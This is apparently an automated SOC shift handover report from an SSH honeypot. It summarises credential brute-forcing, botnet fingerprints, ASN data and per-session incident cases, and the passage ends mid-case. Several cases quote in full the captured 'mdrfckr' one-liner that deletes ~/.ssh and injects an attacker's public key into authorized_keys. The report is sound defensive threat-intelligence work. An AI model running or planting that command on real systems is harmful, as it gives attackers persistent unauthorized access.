# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-27 |
| **Generated At** | 2026-05-27T17:22:12Z |
| **Shift Time** | 17:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **122** |
| Confirmed Threats | **115** |
| False Positives Filtered | **7** (5.7%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **11** |
| High Severity Cases | **44** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **94** |
| Unique Credential Pairs | **37** |
| Unique Usernames | **22** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `345gs5662d34` | 22 |
| `nano` | 2 |
| `janice` | 2 |
| `utente` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `nano123` | 2 |
| `janice` | 2 |
| `utente` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 22 |
| `nano` | `nano123` | 2 |
| `janice` | `janice` | 2 |
| `utente` | `utente` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa@123456789` | `186.96.151.198` | 2026-05-27T13:45:55 |
| `root` | `3245gs5662d34` | `186.96.151.198` | 2026-05-27T13:46:01 |
| `root` | `Airtel@123` | `35.225.56.202` | 2026-05-27T13:50:20 |
| `root` | `3245gs5662d34` | `35.225.56.202` | 2026-05-27T13:50:25 |
| `root` | `admin123..` | `35.225.56.202` | 2026-05-27T13:55:43 |
| `root` | `p@ssw0rd2026` | `35.225.56.202` | 2026-05-27T13:59:48 |
| `root` | `1q2w3e4r5t@` | `35.225.56.202` | 2026-05-27T14:02:45 |
| `root` | `abc123!!` | `35.225.56.202` | 2026-05-27T14:04:11 |
| `root` | `Qwer-1234` | `35.225.56.202` | 2026-05-27T14:07:00 |
| `root` | `@Aa123456` | `35.225.56.202` | 2026-05-27T14:08:26 |
| `root` | `test2025@` | `172.174.72.225` | 2026-05-27T16:23:02 |
| `root` | `3245gs5662d34` | `172.174.72.225` | 2026-05-27T16:23:07 |
| `root` | `test2025@` | `118.35.127.66` | 2026-05-27T16:23:49 |
| `root` | `3245gs5662d34` | `118.35.127.66` | 2026-05-27T16:23:53 |
| `root` | `Admin2025!` | `172.174.72.225` | 2026-05-27T16:24:33 |
| `root` | `Hz123456.` | `172.174.72.225` | 2026-05-27T16:26:08 |
| `root` | `ASDzxc123456` | `172.174.72.225` | 2026-05-27T16:31:01 |
| `root` | `Hr123456` | `118.35.127.66` | 2026-05-27T16:31:56 |
| `root` | `!Q2w#E4r` | `118.35.127.66` | 2026-05-27T16:33:31 |
| `root` | `Hr123456` | `172.174.72.225` | 2026-05-27T16:34:15 |
| `root` | `ASDzxc123456` | `118.35.127.66` | 2026-05-27T16:35:11 |
| `root` | `Asd123456789` | `118.35.127.66` | 2026-05-27T16:36:59 |
| `root` | `!Q2w#E4r` | `172.174.72.225` | 2026-05-27T16:39:02 |
| `root` | `Hz123456.` | `118.35.127.66` | 2026-05-27T16:40:20 |
| `root` | `Asd123456789` | `172.174.72.225` | 2026-05-27T16:40:43 |
| `root` | `Admin2025!` | `118.35.127.66` | 2026-05-27T16:42:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **122** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 100 |
| Perl Net::SSH | 1 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 95 | 6 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 95 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.35.127.66`, `35.225.56.202`, `186.96.151.198`, `172.174.72.225`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **17** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 5 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS30722` | Fastweb SpA | 2 | LOW |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS12271` | Charter Communications Inc | 1 | HIGH |
| `AS22884` | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (44)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-07dd4a66e2ff

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-27 13:45 |
| **Last Seen** | 2026-05-27 13:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:45:54` | `cowrie.session.connect` |
| `2026-05-27 13:45:54` | `cowrie.client.version` |
| `2026-05-27 13:45:54` | `cowrie.client.kex` |
| `2026-05-27 13:45:55` | `cowrie.login.success` |
| `2026-05-27 13:45:55` | `cowrie.session.params` |
| `2026-05-27 13:45:55` | `cowrie.command.input` |
| `2026-05-27 13:45:55` | `cowrie.command.failed` |
| `2026-05-27 13:45:56` | `cowrie.log.closed` |
| `2026-05-27 13:45:56` | `cowrie.session.params` |
| `2026-05-27 13:45:56` | `cowrie.command.input` |
| `2026-05-27 13:45:57` | `cowrie.session.file_download` |
| `2026-05-27 13:45:57` | `cowrie.log.closed` |
| `2026-05-27 13:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef102d72d1ae

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-27 13:46 |
| **Last Seen** | 2026-05-27 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:46:00` | `cowrie.session.connect` |
| `2026-05-27 13:46:00` | `cowrie.client.version` |
| `2026-05-27 13:46:00` | `cowrie.client.kex` |
| `2026-05-27 13:46:01` | `cowrie.login.success` |
| `2026-05-27 13:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a302c69ffb

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:50 |
| **Last Seen** | 2026-05-27 13:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:50:18` | `cowrie.session.connect` |
| `2026-05-27 13:50:18` | `cowrie.client.version` |
| `2026-05-27 13:50:19` | `cowrie.client.kex` |
| `2026-05-27 13:50:20` | `cowrie.login.success` |
| `2026-05-27 13:50:20` | `cowrie.session.params` |
| `2026-05-27 13:50:20` | `cowrie.command.input` |
| `2026-05-27 13:50:20` | `cowrie.command.failed` |
| `2026-05-27 13:50:21` | `cowrie.log.closed` |
| `2026-05-27 13:50:21` | `cowrie.session.params` |
| `2026-05-27 13:50:21` | `cowrie.command.input` |
| `2026-05-27 13:50:21` | `cowrie.session.file_download` |
| `2026-05-27 13:50:21` | `cowrie.log.closed` |
| `2026-05-27 13:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d0619dd8bf

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:50 |
| **Last Seen** | 2026-05-27 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:50:24` | `cowrie.session.connect` |
| `2026-05-27 13:50:24` | `cowrie.client.version` |
| `2026-05-27 13:50:24` | `cowrie.client.kex` |
| `2026-05-27 13:50:25` | `cowrie.login.success` |
| `2026-05-27 13:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bc6249104b

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:55 |
| **Last Seen** | 2026-05-27 13:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:55:42` | `cowrie.session.connect` |
| `2026-05-27 13:55:42` | `cowrie.client.version` |
| `2026-05-27 13:55:42` | `cowrie.client.kex` |
| `2026-05-27 13:55:43` | `cowrie.login.success` |
| `2026-05-27 13:55:43` | `cowrie.session.params` |
| `2026-05-27 13:55:43` | `cowrie.command.input` |
| `2026-05-27 13:55:43` | `cowrie.command.failed` |
| `2026-05-27 13:55:44` | `cowrie.log.closed` |
| `2026-05-27 13:55:44` | `cowrie.session.params` |
| `2026-05-27 13:55:44` | `cowrie.command.input` |
| `2026-05-27 13:55:44` | `cowrie.session.file_download` |
| `2026-05-27 13:55:44` | `cowrie.log.closed` |
| `2026-05-27 13:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc59a04ced01

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:55 |
| **Last Seen** | 2026-05-27 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:55:47` | `cowrie.session.connect` |
| `2026-05-27 13:55:47` | `cowrie.client.version` |
| `2026-05-27 13:55:47` | `cowrie.client.kex` |
| `2026-05-27 13:55:48` | `cowrie.login.success` |
| `2026-05-27 13:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128ccd37ebeb

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:59 |
| **Last Seen** | 2026-05-27 13:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:59:47` | `cowrie.session.connect` |
| `2026-05-27 13:59:47` | `cowrie.client.version` |
| `2026-05-27 13:59:47` | `cowrie.client.kex` |
| `2026-05-27 13:59:48` | `cowrie.login.success` |
| `2026-05-27 13:59:48` | `cowrie.session.params` |
| `2026-05-27 13:59:48` | `cowrie.command.input` |
| `2026-05-27 13:59:48` | `cowrie.command.failed` |
| `2026-05-27 13:59:49` | `cowrie.log.closed` |
| `2026-05-27 13:59:49` | `cowrie.session.params` |
| `2026-05-27 13:59:49` | `cowrie.command.input` |
| `2026-05-27 13:59:50` | `cowrie.session.file_download` |
| `2026-05-27 13:59:50` | `cowrie.log.closed` |
| `2026-05-27 13:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2cdf955076

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 13:59 |
| **Last Seen** | 2026-05-27 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 13:59:52` | `cowrie.session.connect` |
| `2026-05-27 13:59:52` | `cowrie.client.version` |
| `2026-05-27 13:59:53` | `cowrie.client.kex` |
| `2026-05-27 13:59:54` | `cowrie.login.success` |
| `2026-05-27 13:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e4f5dda600

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:02 |
| **Last Seen** | 2026-05-27 14:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:02:43` | `cowrie.session.connect` |
| `2026-05-27 14:02:43` | `cowrie.client.version` |
| `2026-05-27 14:02:44` | `cowrie.client.kex` |
| `2026-05-27 14:02:45` | `cowrie.login.success` |
| `2026-05-27 14:02:45` | `cowrie.session.params` |
| `2026-05-27 14:02:45` | `cowrie.command.input` |
| `2026-05-27 14:02:45` | `cowrie.command.failed` |
| `2026-05-27 14:02:46` | `cowrie.log.closed` |
| `2026-05-27 14:02:46` | `cowrie.session.params` |
| `2026-05-27 14:02:46` | `cowrie.command.input` |
| `2026-05-27 14:02:46` | `cowrie.session.file_download` |
| `2026-05-27 14:02:46` | `cowrie.log.closed` |
| `2026-05-27 14:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6634f2c7095

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:02 |
| **Last Seen** | 2026-05-27 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:02:49` | `cowrie.session.connect` |
| `2026-05-27 14:02:49` | `cowrie.client.version` |
| `2026-05-27 14:02:50` | `cowrie.client.kex` |
| `2026-05-27 14:02:51` | `cowrie.login.success` |
| `2026-05-27 14:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f1b1b80a59

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:04 |
| **Last Seen** | 2026-05-27 14:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:04:10` | `cowrie.session.connect` |
| `2026-05-27 14:04:10` | `cowrie.client.version` |
| `2026-05-27 14:04:10` | `cowrie.client.kex` |
| `2026-05-27 14:04:11` | `cowrie.login.success` |
| `2026-05-27 14:04:12` | `cowrie.session.params` |
| `2026-05-27 14:04:12` | `cowrie.command.input` |
| `2026-05-27 14:04:12` | `cowrie.command.failed` |
| `2026-05-27 14:04:12` | `cowrie.log.closed` |
| `2026-05-27 14:04:12` | `cowrie.session.params` |
| `2026-05-27 14:04:12` | `cowrie.command.input` |
| `2026-05-27 14:04:13` | `cowrie.session.file_download` |
| `2026-05-27 14:04:13` | `cowrie.log.closed` |
| `2026-05-27 14:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bd77360d720

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:04 |
| **Last Seen** | 2026-05-27 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:04:15` | `cowrie.session.connect` |
| `2026-05-27 14:04:15` | `cowrie.client.version` |
| `2026-05-27 14:04:16` | `cowrie.client.kex` |
| `2026-05-27 14:04:17` | `cowrie.login.success` |
| `2026-05-27 14:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd530b2cf02d

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:06 |
| **Last Seen** | 2026-05-27 14:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
